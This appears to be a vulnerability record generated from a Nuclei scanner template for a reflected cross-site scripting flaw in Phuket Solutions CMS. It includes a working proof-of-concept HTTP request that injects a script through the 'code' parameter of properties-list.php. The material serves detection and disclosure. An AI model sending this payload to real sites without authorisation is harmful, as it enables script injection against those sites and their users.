# Nuclei Template: Phuket Solution CMS - Cross Site Scripting
**Template ID:** phuket-cms-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** Medium
**CWE:** CWE-79
**Source:** Nuclei Template (`phuket-cms-xss.yaml`)

## Vulnerability Information & PoC

## Description
Phuket Solutions CMS is vulnerable to Reflected XSS in which an attacker injects malicious executable scripts into the code of a trusted application or website.

## Steps to reproduce / Exploit Payload
```http
GET /properties-list.php?property-types=1&types=2&location=&prices=&bedroom=&code=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1
Host: {{Hostname}}
```

## References
- https://www.exploitalert.com/view-details.html?id=36234
